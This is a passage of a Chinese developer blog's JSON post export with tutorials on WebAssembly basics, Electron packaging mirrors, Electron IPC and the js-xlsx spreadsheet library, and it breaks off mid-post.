WebAssembly","date":"2017-11-10T01:48:36.000Z","updated":"2021-06-15T06:10:52.823Z","comments":true,"path":"/stories/2017/11/HTML5/探索 WebAssembly/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/HTML5/探索 WebAssembly/","excerpt":"前言WebAssembly 小探索，主要包括的内容有： WebAssembly 概念 从 C/C++ 编译为 WebAssembly 加载运行 WebAssembly 代码 WebAssembly 与 JavaScript 交互","text":"前言WebAssembly 小探索，主要包括的内容有： WebAssembly 概念 从 C/C++ 编译为 WebAssembly 加载运行 WebAssembly 代码 WebAssembly 与 JavaScript 交互 WebAssembly 概念WebAssembly 是什么？WebAssembly 是一种运行在现代网络浏览器中的新型代码并且提供新的性能特性和效果。它设计的目的不是为了手写代码而是为诸如 C、C++ 和 Rust 等低级源语言提供一个高效的编译目标。 WebAssembly 是一门低级的类汇编语言。它有一种紧凑的二进制格式，使其能够以接近原生性能的速度运行并且为诸如 C/C++ 和 Rust 等拥有低级的内存模型语言提供了一个编译目标以便它们能够在网络上运行。 WebAssembly 有以下几个关键的概念： 模块：表示一个已经被浏览器编译为可执行机器码的 WebAssembly 二进制代码。 内存：一个可变大小的 ArrayBuffer。它包含了一个连续的字节数组并且 WebAssembly 的低级内存存取指令可对其进行读写操作。 表格：一个可变大小的包含引用类型（比如，函数）的带类型数组。 实例：一个模块及其在运行时使用的所有状态，包括内存、表格和一系列导入值。 目前 WebAssembly 在部分最新的浏览器和 Nodejs v8.0+（包括 Electron，Node-Webkit 等携带 webkit 的框架）上都可以运行。另外是否能在 React Native，Weex 等跨平台技术上运行，有待考察。 可以使用下面这段代码测试： 1234567891011121314WebAssembly.compile(new Uint8Array(` 00 61 73 6d 01 00 00 00 01 0c 02 60 02 7f 7f 01 7f 60 01 7f 01 7f 03 03 02 00 01 07 10 02 03 61 64 64 00 00 06 73 71 75 61 72 65 00 01 0a 13 02 08 00 20 00 20 01 6a 0f 0b 08 00 20 00 20 00 6c 0f 0b`.trim().split(/[\\s\\r\\n]+/g).map(str =&gt; parseInt(str, 16)))).then(module =&gt; &#123; const instance = new WebAssembly.Instance(module); const &#123; add, square &#125; = instance.exports; console.log('2 + 4 =', add(2, 4)); console.log('3^2 =', square(3)); console.log('(2 + 5)^2 =', square(add(2 + 5)));&#125;); 从 C/C++ 编译为 WebAssembly目前 Webassembly 的代码只有由 C/C++ 编写，可以使用诸如 Emscripten 的工具把它编译为 .wasm 文件。 这里不讲 Emscripten 的配置，具体参考：Emscripten getting started 12345#include &lt;stdio.h&gt;int main(int argc, char ** argv) &#123; printf(\"Hello World\\n\");&#125; 上面是一个 C 的 Hello World 代码，现在把它编译成 .wasm 文件。Emscripten 工具的 emcc 命令把它编译成 WebAssembly 二进制代码。 1emcc hello.c -s WASM=1 -o hello.html 其中： -s WASM=1 — 指定我们想要的 wasm 输出形式。如果我们不指定这个选项，Emscripten 默认将只会生成 asm.js。 -o hello.html — 指定这个选项将会生成 HTML 页面来运行我们的代码，并且会生成 wasm 模块以及编译和实例化 wasim 模块所需要的 js 代码，这样我们就可以直接在 web 环境中使用了。 这样，就多出了 3 个文件：hello.wasm，hello.js，hello.html 自定义 C/C++ 函数新建一个 math.c 文件，在 math.c 里编写两个函数。 12345678// math.cint add (int x, int y) &#123; return x + y;&#125;int square (int x) &#123; return x * x;&#125; 接着编译： 1emcc math.c -Os -s WASM=1 -s SIDE_MODULE=1 -o math.wasm 加载运行 WebAssembly 代码WebAssembly 的模块可以被导入的到一个 Web 应用或 Node.js 中，并且暴露出供 JavaScript 使用的 WebAssembly 函数。为了在 JavaScript 中使用 WebAssembly，在编译/实例化之前，你首先需要把模块放入内存，比如，通过 XMLHttpRequest 或 Fetch，模块将会被初始化为带类型数组。 123456function loadWebAssembly (path, imports = &#123;&#125;) &#123; return fetch(path) // 加载文件 .then(res =&gt; res.arrayBuffer()) // 转成 ArrayBuffer .then(betys =&gt; WebAssembly.instantiate(betys, imports)) // 编译 + 实例化 .then(mod =&gt; mod.instance) // 提取生成都模块&#125; 完成了上边的操作，就可以直接使用 loadWebAssembly 这个方法加载 wasm 文件了，它相当于是一个 wasm-loader。 接着我们就可以在 JavaScript 里调用 C 的函数。 12345loadWebAssembly('./math.wasm') .then(instance =&gt; &#123; const &#123; add, square &#125; = instance.exports // ... &#125;) 如果你直接使用上边那个 loadWebAssembly 函数，有可能会执行失败，因为在 wasm 文件里，可能还会引入一些环境变量，在实例化的同时还需要初始化内存空间和变量映射表，也就是 WebAssembly.Memory 和 WebAssembly.Table。 具体比较建议使用 Webpack 的 wasm-loader。 Webpack在 Webpack 里已经有对应的 loader 支持加载 .wasm 文件了。这样就可以很方便的使用 require 来加载 WebAssembly 代码。在导入的时候，wasm 文件被转换为 Uint8Arrays，并成为完整的 js 捆绑的一部分！ 安装： 1npm install --save wasm-loader 配置： 12345678// edit webpack.config.js:loaders: [ &#123; test: /\\.wasm$/, loaders: ['wasm-loader'] &#125; // ...] 使用： 1234567891011import makeFactorial from 'wasm/factorial';(async () =&gt; &#123; const instance = await makeFactorial() // _Z4facti 是 C++ 里面导出的模块 const factorial = instance.exports._Z4facti; console.log(factorial(1)); // 1 console.log(factorial(2)); // 2 console.log(factorial(3)); // 6&#125;)(); wast 格式WebAssembly 除了定义了二进制格式以外，还定义了一份对等的文本描述，这种文本相比二进制格式具有一定的可读性。 在 Webassembly 之前有个 asm.js 的库，现在它可以通过编写 js 代码，再把 js 代码编译成 wasm。 asm 的代码需要使用 &quot;use asm&quot; 来指定。比如： 1234567891011121314151617181920// math.jsfunction () &#123; \"use asm\"; // x | 0 是利用位运算转为整型 function add (x, y) &#123; x = x | 0; y = y | 0; return x + y | 0; &#125; function square (x) &#123; x = x | 0; return x * x | 0; &#125; return &#123; add: add, square: square &#125;;&#125; Emscripten 能生成 asm.js 和 wasm ，但是却不能把 asm.js 转成 wasm。因此要使用另外的编译工具把 asm.js 编译成 wasm。asm.js 官方提供的 Binaryen 和 WABT (WebAssembly Binary Toolkit) 工具了。 原理和编译方法参考官方文档，整个过程大概是这样的： 1234567// 描述过程 Binaryen WABTmath.js ---&gt; math.wast ---&gt; math.wasm// 命令过程asm2wasm math.js -o math.wastwast2wasm math.wast -o math.wasm 编译成 wast 格式就可以看到下面的代码。 12345678910111213141516171819202122(module (export \"add\" (func $add)) // 导出一个 add api (export \"square\" (func $square)) // 导出一个 square api (func $add (param $x i32) (param $y i32) (result i32) (return (i32.add (get_local $x) (get_local $y) ) ) ) (func $square (param $x i32) (result i32) (return (i32.mul (get_local $x) (get_local $x) ) ) )) 从代码里，我们基本可以知道： module 代表着一个模块。 export 代表着导出某个 api，后面 func $add 代表它的实现内容。 以 $add 为例，param $x i32 说明，有一个参数 x，它的类型为 32 位整型，result 代表返回的类型为 32 位整型，return 中间部分是函数的实现。 WebAssembly 与 JavaScript 交互在有了 loadWebAssembly 这个方法之后，就可以给 wasm 代码传递 js 变量和函数了。 12345678910111213141516const imports = &#123; Math, objects: &#123; count: 2333 &#125;, methods: &#123; output (message) &#123; console.log(`-----&gt; $&#123;message&#125; &lt;-----`) &#125; &#125;&#125;loadWebAssembly('path/to/source.wasm', imports) .then(instance =&gt; &#123; // ... &#125;) 这样就把 JavaScript API 传递给了 wasm，具体要怎么样用呢？wasm 的代码最外层声明的是一个模块，我们能向外 export 接口，当然也可以 import 接口。 1234567891011121314(module (import \"objects\" \"count\" (global $count f32)) (import \"methods\" \"output\" (func $output (param f32))) (import \"Math\" \"sin\" (func $sin (param f32) (result f32))) (export \"test\" (func $test)) // 导出一个 test api (func $test (param $x f32) (call $output (f32.const 42)) // 参数为常量 42 (call $output (get_global $count)) // 参数为全局变量 $count (call $output (get_local $x)) // 参数为局部变量 $x (call $output (call $sin (get_local $x))) // 参数 $sin 的返回值 )) 这段代码也是在最外层声明了一个 module，然后前三行是 import 语句。 首先从 objects 中导入 count 属性，并且在代码里声明为全局的 $count 变量，格式是 32 位浮点数。 1(import \"objects\" \"count\" (global $count f32)) 然后从 methods 中导入 output 方法，声明为一个接受 32 位浮点数作为参数的函数 $output。 1(import \"methods\" \"output\" (func $output (param f32))) 从 Math 中导入 sin 方法，声明为一个接受 32 位浮点数作为参数的函数 $sin，返回值也是 32 位浮点数。 1(import \"Math\" \"sin\" (func $sin (param f32) (result f32))) 最后定义了一个 test 函数，这个函数里使用了 call 来调用了 $output 方法，并传递了一些参数。 调用 JS API通过命令编译，生成 wasm 文件。 1west2wasm source.wast -o source.wasm 之后在 js 里调用接口： 1234567891011loadWebAssembly('./source.wasm', imports) .then(instance =&gt; &#123; const &#123; test &#125; = instance.exports; test(2333); &#125;);// 输出// -----&gt; 42 &lt;-----// -----&gt; 666 &lt;-----// -----&gt; 2333 &lt;-----// -----&gt; 0.9332447648048401 &lt;----- Emscripten 接口除此之外，还可以使用 Emscripten 提供的接口。通过引入 emscripten.h 文件，它提供了大量用于 JavaScript、HTML 与 WebAssembly 进行通讯的 API。 123456#include &lt;emscripten.h&gt;int main() &#123; EM_ASM( alert(\"hai\")); return 0;&#125; 为了简化调用，Emscripten 提供了 EMSCRIPTEN_BINDING 等 API，可以将一个 C++ 类和函数与 JavaScript 进行直接绑定。 由于 WebAssembly 与 JavaScript 的调用存在着一定的性能问题，建议通过共享内存的方式进行交互。同时也不建议与 JavaScript 有太大的交互关系，比较推荐的方式是在 C/C++ 编写函数模块，在 JavaScript 里传递参数即可。 参考资料 http://webassembly.org/docs/high-level-goals/ https://developer.mozilla.org/en-US/docs/WebAssembly https://github.com/mbasso/awesome-wasm https://github.com/ballercat/wasm-loader https://segmentfault.com/a/1190000008402872 http://geek.csdn.net/news/detail/231797","categories":[{"name":"WebAssembly","slug":"WebAssembly","permalink":"http://me.lizhooh.com/categories/WebAssembly/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"},{"name":"WebAssembly","slug":"WebAssembly","permalink":"http://me.lizhooh.com/tags/WebAssembly/"}]},{"title":"解决 Electron 打包被墙的问题","slug":"Electron/解决 Electron 打包被墙的问题","date":"2017-11-06T01:36:53.000Z","updated":"2021-06-15T06:10:52.815Z","comments":true,"path":"/stories/2017/11/Electron/解决 Electron 打包被墙的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/Electron/解决 Electron 打包被墙的问题/","excerpt":"前言在大天朝做开发真不容易啊，网络各种被墙，加上十九大之后 VPN 不是被封，就是自己主动关闭业务。 目前，打包 Electron 应用主要是两个工具： electron-packager electron-builder 到很不幸的是，它们在打包时都会下载几个 zip，更不幸的是，网络被墙了。","text":"前言在大天朝做开发真不容易啊，网络各种被墙，加上十九大之后 VPN 不是被封，就是自己主动关闭业务。 目前，打包 Electron 应用主要是两个工具： electron-packager electron-builder 到很不幸的是，它们在打包时都会下载几个 zip，更不幸的是，网络被墙了。 下面的方法是把镜像地址改成淘宝的镜像。 安装模块的问题安装模块也是被墙了，解决的方法是使用 cnpm 或者 yarn。 直接设置镜像： 1npm config set ELECTRON_MIRROR http://npm.taobao.org/mirrors/electron/ electron-packager在配置项里添加： 123\"download\": &#123; \"mirror\": \"https://npm.taobao.org/mirrors/electron/\"&#125; 如果是命令行，则添加参数： 1--download.mirror=https://npm.taobao.org/mirrors/electron/ electron-builder在 package.json 的 build 里添加： 123\"electronDownload\": &#123; \"mirror\": \"https://npm.taobao.org/mirrors/electron/\"&#125;, 如果是命令行，则添加参数： 1--electronDownload.mirror=https://npm.taobao.org/mirrors/electron/ 参考资料 https://github.com/electron-userland/electron-packager/blob/master/docs/api.md#downloadhttps://www.electron.build/configuration/configuration","categories":[{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/categories/Electron/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/tags/Electron/"}]},{"title":"Electron 主进程与渲染进程通信","slug":"Electron/Electron 主进程与渲染进程通信","date":"2017-11-02T10:56:11.000Z","updated":"2021-06-15T06:10:52.814Z","comments":true,"path":"/stories/2017/11/Electron/Electron 主进程与渲染进程通信/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/Electron/Electron 主进程与渲染进程通信/","excerpt":"主进程与渲染进程Electron 中，从 package.json 的 main 载入的 js 件就是主进程，由主进程加载出来的页面就是渲染进程。 主进程负责掌管所有的 Web 页面和它们相应的渲染进程，包括原生的组件操作。而在 Electron 里的每个页面都有它自己的进程，叫作渲染进程，它主要负责 Web 的渲染。 主进程通过实例化 BrowserWindow，每个 BrowserWindow 实例都在它自己的渲染进程内返回一个 web 页面。当 BrowserWindow 实例销毁时，相应的渲染进程也会终止。 在渲染进程中不允许调用原生 GUI 相关的 API，那是因为在网页（渲染进程）中使用原生 GUI 很危险，易造成内存泄露。","text":"主进程与渲染进程Electron 中，从 package.json 的 main 载入的 js 件就是主进程，由主进程加载出来的页面就是渲染进程。 主进程负责掌管所有的 Web 页面和它们相应的渲染进程，包括原生的组件操作。而在 Electron 里的每个页面都有它自己的进程，叫作渲染进程，它主要负责 Web 的渲染。 主进程通过实例化 BrowserWindow，每个 BrowserWindow 实例都在它自己的渲染进程内返回一个 web 页面。当 BrowserWindow 实例销毁时，相应的渲染进程也会终止。 在渲染进程中不允许调用原生 GUI 相关的 API，那是因为在网页（渲染进程）中使用原生 GUI 很危险，易造成内存泄露。 利用 ipcMain 与 ipcRenderer 通信ipcMain 模块是类 EventEmitter 的实例。当在主进程中使用它的时候，它控制着由渲染进程发送过来的异步或同步消息，从渲染进程发送过来的消息将触发事件，同样也可以从主进程向渲染进程发送消息，事件的对称的。 因此，可以通过事件的订阅或与发布，实现主进程与渲染进程之间的通信。 在主进程里，使用 ipcMain 向渲染线程发出通知 123456789101112const ipcMain = require('electron').ipcMain;// 异步通信ipcMain.on('asynchronous-message', function(event, arg) &#123; console.log(arg); // prints \"ping\" event.sender.send('asynchronous-reply', 'pong');&#125;);// 同步通信ipcMain.on('synchronous-message', function(event, arg) &#123; console.log(arg); // prints \"ping\" event.returnValue = 'pong';&#125;); 在渲染进程里，使用 ipcRenderer 向主线程发出通知 1234567891011const ipcRenderer = require('electron').ipcRenderer;// 发一个同步消息给所以 synchronous-message 监听者console.log(ipcRenderer.sendSync('synchronous-message', 'ping')); // prints \"pong\"// 监听ipcRenderer.on('asynchronous-reply', function(event, arg) &#123; console.log(arg); // prints \"pong\"&#125;);// 发一个异步消息给所有 asynchronous-message 监听者ipcRenderer.send('asynchronous-message', 'ping'); 注意的地方，在 ipcMain 里是不能主动向 ipcRenderer 发消息的，只能在 event 里回消息。 ipcMain APIipcMain 模块有以下方法： ipcMain.on(channel, listener) 监听 channel, 当新消息到达，将通过 listener(event, args…) 调用 listener。 ipcMain.once(channel, listener) 监听一次（一次性）。 ipcMain.removeListener(channel, listener) 取消监听。 ipcMain.removeAllListeners([channel]) 取消全部监听。 而在 listener 里 event 有以下属性： event.returnValue 将此设置为在一个同步消息中返回的值。 event.sender 返回发送消息的 webContents ，你可以调用 event.sender.send 来回复异步消息。 ipcRenderer APIipcRenderer 模块有以下方法： ipcRenderer.on(channel, listener) 监听 channel, 当新消息到达，将通过 listener(event, args…) 调用 listener。 ipcRenderer.once(channel, listener) 监听一次（一次性）。 ipcRenderer.removeListener(channel, listener) 取消监听。 ipcRenderer.removeAllListeners([channel]) 取消全部监听。 ipcRenderer.send(channel[, arg1][, arg2][, …]) 通过 channel 向主进程发送异步消息，也可以发送任意参数。 ipcRenderer.sendSync(channel[, arg1][, arg2][, …]) 通过 channel 向主进程发送同步消息，也可以发送任意参数。 ipcRenderer.sendToHost(channel[, arg1][, arg2][, …]) 它的事件将发往 host page 的 &lt;webview&gt; 元素，而不是主进程。 利用 remote 通信remote 模块提供了一种在渲染进程（网页）到主进程之间进行进程间通讯（IPC）的简便途径。 注意: 反向操作（从主进程访问渲染进程），可以使用 webContents.executeJavascript. Electron 中与 GUI 相关的模块（如 dialog, menu 等）只存在于主进程，而不在渲染进程中。为了能从渲染进程中使用它们，需要用 ipc 模块来给主进程发送进程间消息。使用 remote 模块，可以调用主进程对象的方法，而无需显式地发送进程间消息。 remote 模块返回的每个对象（包括函数）都代表了主进程中的一个对象。 在主进程中的内置模块已经被添加为 remote 模块中的属性，所以可以直接像使用 electron 模块一样直接使用它们。 123456// 在渲染进程文件里const remote = require('electron').remote;const BrowserWindow = remote.BrowserWindow;var win = new BrowserWindow(&#123; width: 800, height: 600 &#125;);win.loadURL('https://github.com'); remote APIremote 模块有以下方法： remote.require(module) 返回在主进程中执行 require(module) 所返回的对象。 remote.getCurrentWindow() 返回该网页所属的 BrowserWindow 对象。 remote.getCurrentWebContents() 返回该网页的 WebContents 对象。 remote.getGlobal(name) 返回在主进程中名为 name 的全局变量(即 global[name])。 remote.process 返回主进程中的 process 对象。等同于 remote.getGlobal(‘process’) 但是有缓存。 参考资料 https://electron.atom.io/docs/api/ipc-main/ https://electron.atom.io/docs/api/ipc-renderer/","categories":[{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/categories/Electron/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/tags/Electron/"}]},{"title":"js-xlsx 使用教程","slug":"HTML5/js-xlsx 使用教程","date":"2017-11-01T11:39:24.000Z","updated":"2021-06-15T06:10:52.821Z","comments":true,"path":"/stories/2017/11/HTML5/js-xlsx 使用教程/","link":"","permalink":"http://me.lizhooh.com/stories/2017/11/HTML5/js-xlsx 使用教程/","excerpt":"js-xlsxjs-xlsx 是一个纯 JavaScript 实现的，能够运行在所有 JavaScript 环境（包括浏览器，Nodejs，React Native，Electron 等）的 Excel 库，能够读取和写入 Excel 表格文件，能够支持最新版本的 XLSX 文件，使用方法也很简单。 示例： https://github.com/Lizhooh/js-xlsx-demo","text":"js-xlsxjs-xlsx 是一个纯 JavaScript 实现的，能够运行在所有 JavaScript 环境（包括浏览器，Nodejs，React Native，Electron 等）的 Excel 库，能够读取和写入 Excel 表格文件，能够支持最新版本的 XLSX 文件，使用方法也很简单。 示例： https://github.com/Lizhooh/js-xlsx-demo 下面就开始介绍 js-xlsx 的简单使用方式。 XLSX使用之前，先安装它： 1npm install --save xlsx XLSX 是 js-xlsx 的根对象，主要有以下属性。 1const XLSX = require('xlsx'); 其中： SSF 里定义了一些数据格式。 parse* 是解析相关。 read* 是用来读取 xlsx 文件的 API。 write* 是用来把数据写入并生成 xlsx 文件的 API。 version 指的是 js-xlsx 的版本。 读取 Excel 数据为了解析，第一步是读取文件，这里有几个不同的地方： 在 nodejs 上，通过文件 IO 获取数据。 12const XLSX = require('xlsx');const workbook = XLSX.readFile('test.xlsx'); 因为 Excel 数据表与 HTML Table 结构是相对应的，所以也可以从 Table 里获取数据。 1const worksheet = XLSX.utils.table_to_book(document.getElementById('tableau')); 通过 url（ajax）获取数据。 1234567891011let url = \"/formula_stress_test.xlsx\";let req = new XMLHttpRequest();req.open(\"GET\", url, true);req.responseType = \"arraybuffer\";req.onload = function(e) &#123; let data = new Uint8Array(req.response); let workbook = XLSX.read(data, &#123;type:\"array\"&#125;);&#125;req.send(); 通过 HTML5 文件拖拽获取数据。 12345678910111213141516$('#drop').on('drop', e =&gt; &#123; e.stopPropagation(); e.preventDefault(); let files = e.dataTransfer.files; let reader = new FileReader(); reader.readAsArrayBuffer(files[0]); reader.onload = function (e) &#123; let data = e.target.result; let wb = XLSX.read(data, &#123; type: 'array' &#125;); // 只取第一个 sheet var wsname = wb.SheetNames[0]; var ws = wb.Sheets[wsname]; // 渲染 excelView.innerHTML = XLSX.utils.sheet_to_html(ws); &#125;;&#125;) 通过 HTML5 FileReader API 获取数据。 1234567891011121314$('#file').on('change', ev =&gt; &#123; let files = ev.target.files; let reader = new FileReader(); reader.readAsBinaryString(files[0]); reader.onload = function (e) &#123; let data = e.target.result; let ws = XLSX.read(data, &#123; type: 'array' &#125;); // 只取第一个 sheet var wsname = wb.SheetNames[0]; var ws = wb.Sheets[wsname]; // 渲染 excelView.innerHTML = XLSX.utils.sheet_to_html(ws); &#125;;&#125;) js-xlsx 的解析数据 API： 函数 描述 XLSX.read(data, read_opts) 尝试解析 data。 XLSX.readFile(filename, read_opts) 根据文件路径名，继续解析。 workbookworkbook 就是读取 Excel 数据后的 json 对象，里面记录着 Excel 的数据信息，它有以下的属性。 Custprops 存储自定义属性，Workbook 存储工作簿级属性，SSF 定义了一些数据格式，Directory 是 Excel 文件的描述对象，Props 是 xlsx 文件的属性。 SheetNames 里存储着每个 Sheet 的名字。而 Sheets 里储存的是每个 Sheet 的数据。 每个 Sheet 对象里都根据坐标存储 Excel 的二维数据，其中 !ref 代表着这个表的范围。 对应的是 Excel 表数据。 Strings 是一个数组，它按照从左到右，从上到下的顺序来把二维的数据降到一维。 可以参考下面的实现算法： 12345678910const arr = [ [1, 2, 3], [4, 5, 6], [7, 8, 9],];const cat = (...arg) =&gt; arg.reduce((acc, cur) =&gt; [...acc, ...cur], []);// 将二维降为一维cat(...arr); // =&gt; [1, 2, 3, 4, 5, 6, 7, 8, 9] 单元格对象在下图中 A1 就是一个单元格对象，它代表着 Excel 二维表里的 A1 位置的单元格对象。 单元格对象有以下描述属性： 属性 描述 v 原始值（请参阅数据类型部分了解更多信息） w 格式化文本 t 单元格类型：b 布尔值，n 数字，e 错误，s 字符串，d 日期 f 单元格的公式，例如 f: &#39;A1 + A2&#39; F 如果公式是数组公式 r 富文本编码 h 富文本的 HTML 呈现 c 与单元格相关的注释 z 与单元格关联的数字格式字符串 l 单元格超链接对象（.Target 持有链接，.Tooltip 是工具提示） s 单元格的样式/主题（可以设置字体颜色，加粗等） 样式可以参考下面的设置： 123456789const STYLE = &#123; border: &#123; right: &#123; style: 'thick', color: &#123; auto: 1 &#125; &#125;, top: &#123; style: 'thick', color: &#123; auto: 1 &#125; &#125;, bottom: &#123; style: 'thick', color: &#123; auto: 1 &#125; &#125; &#125;, fill: &#123; fgColor: &#123; rgb: \"ff6600\" &#125; &#125;, font: &#123; name: \"Arial\", sz: 24 &#125;&#125;; 导出 Excel 表对于写入，第一步是生成输出数据。对于生成输出数据也分为几种： 在 nodejs 上 12const XLSX = require('xlsx');XLSX.writeFile(workbook, 'out.xlsx'); 因为 Excel 是一个表结构，因此可以轻易输出 HTML Table 123const worksheet = workbook.Sheets[workbook.SheetNames[0]];const container = document.getElementById('tableau');container.innerHTML = XLSX.utils.sheet_to_html(worksheet); 浏览器保存 123456789101112131415// 类型可以是任何的let wopts = &#123; bookType: 'xlsx', bookSST: false, type: 'binary' &#125;;let wbout = XLSX.write(workbook, wopts);function s2ab(s) &#123; let buf = new ArrayBuffer(s.length); let view = new Uint8Array(buf); for (let i = 0; i != s.length; ++i) &#123; view[i] = s.charCodeAt(i) &amp; 0xFF; &#125; return buf;&#125;// 保存 - https://github.com/eligrey/FileSaver.jssaveAs(new Blob([s2ab(wbout)], &#123; type: \"application/octet-stream\" &#125;), \"test.xlsx\"); 上传到服务器 12345678910// 通过 FormData 上传到服务器let wopts = &#123; bookType: 'xlsx', bookSST: false, type: 'base64' &#125;;let wbout = XLSX.write(workbook, wopts);let req = new XMLHttpRequest();req.open(\"POST\", \"/upload\", true);let formdata = new FormData();formdata.append('file', 'test.xlsx');formdata.append('data', wbout);req.send(formdata); js-xlsx 写入数据 API： 函数 描述 XLSX.write(wb, write_opts) 写到 wb 里 XLSX.writeFile(wb, filename, write_opts) 写入文件里 XLSX.writeFileAsync(filename, wb, o, cb) 异步方式，写入文件里 工具函数XLSX.utils 是一个工具 API，一些函数用于把数据导出各种格式。 sheet_to_*函数接受一个工作表和一个可选的选项对象。*_to_sheet 函数接受一个数据对象和一个可选选项对象。 列出几个有用的属性/函数： 属性/函数 描述 XLSX.utils.sheet_to_csv 生成 CSV。 XLSX.utils.sheet_to_html 生成 HTML。 XLSX.utils.sheet_to_json 生成一个对象数组。 XLSX.utils.sheet_to_formulae 生成公式列表。 XLSX.utils.book_new() 创建一个默认的 Excel 文件描述对象。 XLSX.utils.book_append_sheet(wb, ws, “test”) 向 workbook 添加一个 ws，名称为 test。 aoa_to_sheet 将 js 数据的数组转换为工作表。 json_to_sheet 将 js 对象的数组转换为工作表。 table_to_sheet 将 DOM TABLE 元素转换为工作表。 sheet_to_json 将工作表对象转换为 JSON 对象数组。 sheet_to_csv 生成分隔符分隔值输出。 sheet_to_html 生成 HTML 输出。 sheet_to_formulae 生成公式列表（具有值回退）。 format_cell 生成单元格的文本值（使用数字格式）。 encode_row/decode_row 在 0 索引行和 1 索引行之间进行转换。 encode_col/decode_col 在 0 索引列和列名之间进行转换。 encode_cell/decode_cell 转换单元格地址。 encode_range/decode_range 转换单元格范围。 例子： 123456789const fs = require('fs');const XLSX = require('xlsx');const workbook = XLSX.readFile('data.xlsx');const wsname = workbook.SheetNames[0];const ws = workbook.Sheets[wsname]; // 取第一个 sheetconst json = XLSX.utils.sheet_to_json(ws);fs.writeFileSync('./data.json', JSON.stringify(json, null, 4)); 数据自定义上面都是介绍导入/导出 Excel 表数据，这里介绍如何通过代码来自定义 Excel 表内容。有几种方式来定义数据对象： 阵列数组 对象数组 HTML Table 阵列数组1234567891011121314// 构造一个二维表const ws = XLSX.utils.aoa_to_sheet([ \"今天吃饭了吗\".split(\"\"), // 第一行]);// &#123;// A1: &#123; v: '今', t: 's' &#125;,// B1: &#123; v: '天', t: 's' &#125;,// C1: &#123; v: '吃', t: 's' &#125;,// D1: &#123; v: '饭', t: 's' &#125;,// E1: &#123; v: '了', t: 's' &#125;,// F1: &#123; v: '吗', t: 's' &#125;,// '!ref': 'A1:F1'// &#125; 对象数组12345678const ws = XLSX.utils.json_to_sheet( [ &#123; S: 1, h: 2, e: 3, e_1: 4, t: 5, J: 6, S_1: 7 &#125;, // 第一行 &#123; S: 2, h: 3, e: 4, e_1: 5, t: 6, J: 7, S_1: 8 &#125; // 第二行 ], &#123; header: [\"S\", \"h\", \"e\", \"e_1\", \"t\", \"J\", \"S_1\"] // 表头 &#125;); HTML Table1234567891011&lt;table id=\"sheetjs\"&gt; &lt;tr&gt; &lt;td&gt;S&lt;/td&gt; &lt;td&gt;h&lt;/td&gt; &lt;td&gt;e&lt;/td&gt; &lt;td&gt;e&lt;/td&gt; &lt;td&gt;t&lt;/td&gt; &lt;td&gt;J&lt;/td&gt; &lt;td&gt;S&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;4&lt;/td&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;6&lt;/td&gt; &lt;td&gt;7&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;2&lt;/td&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;4&lt;/td&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;6&lt;/td&gt; &lt;td&gt;7&lt;/td&gt; &lt;td&gt;8&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 12const tbl = document.getElementById('sheetjs');const wb = XLSX.utils.table_to_book(tbl); 之后需要将新的 数据对象添加到 workbook 里： 12345678let ws_name = \"SheetJS\";let ws = XLSX.utils.aoa_to_sheet([ [\"S\", \"h\", \"e\", \"e\", \"t\", \"J\", \"S\"], [ 1, 2, 3, 4, 5]]);wb.SheetNames.push(ws_name);wb.Sheets[ws_name] = ws; 生成 xlsx 文件之后，定义你的 workbook 对象， js-xlsx 提供一个默认的 workbook 对象（XLSX.utils.book_new）。 此外还可以通过 IO 方式获取一个默认的 Excel 文件 workbook 对象。在这里，我通过新建了一个空的 Excel 文件，读取它的 workbook 对象，把 workbook 对象保存到 json 文件里，作为默认配置来使用。 123456const fs = require('fs');const XLSX = require('xlsx');// default.xlsx 是一个空的 Excel 文件const workbook = XLSX.readFile('default.xlsx');fs.writeFileSync('./default.json', JSON.stringify(workbook, null, 4)); 最后使用模版数据： 1234567891011121314151617181920212223const XLSX = require('xlsx');const fs = require('fs');// 读取模版const workbook = JSON.parse(fs.readFileSync('./default.json'));const ws = XLSX.utils.aoa_to_sheet([ ['学校', '姓名', '学号'], ['电子神技大学', '张三', 'A-201701010211'], ['电子神技大学', '黎明', 'A-201701010212'],]);workbook.SheetNames.unshift('test');workbook.Sheets['test'] = ws;workbook.Props.Worksheets = workbook.Sheets.length;workbook.Props.SheetNames = workbook.SheetNames;// 保存 jsonfs.writeFileSync('./data.json', JSON.stringify(workbook, null, 4));// 保存 xlsx 文件XLSX.writeFile(workbook, 'output.xlsx'); 在 output.xlsx 里可以看到： 合并单元格往往 Excel 表，很多时候都需要合并一些单元格来达到数据的统一与美观性。 合并表格的数据在 Sheets Object 里的 !merges 属性里，它是一个数组，数组的顺序是按照二维表顺序（从左到右，从上到下）排列。 比如在上图里，我们合并了 B1-C1、A2-A4，!merges 数组里记录的信息如下。 1234567[&#123; s: &#123; c: 1, r: 0 &#125; // 第 0 行第 1 列开始，也就是 B1 e: &#123; c: 2, r: 0 &#125; // 第 0 行第 2 列结束，也就是 C1&#125;, &#123; s: &#123; c: 0, r: 1 &#125; // 第 1 行第 0 列开始，也就是 A2 e: &#123; c: 0, r: 3 &#125; // 第 1 行第 3 列结束，也就是 A4&#125;] 其中 s 是 start 的简写，e 是 end 的简写，c 是 column 的简写，r 是 row 的简写（这种简写方式主要是为了节约内存，想想 Excel 表里可能有上万个单元格，如果用全称实在是太浪费内存）。 因此，按照这种规律，在生成 Excel 文件时，设置 workbook sheet 里的 !merges 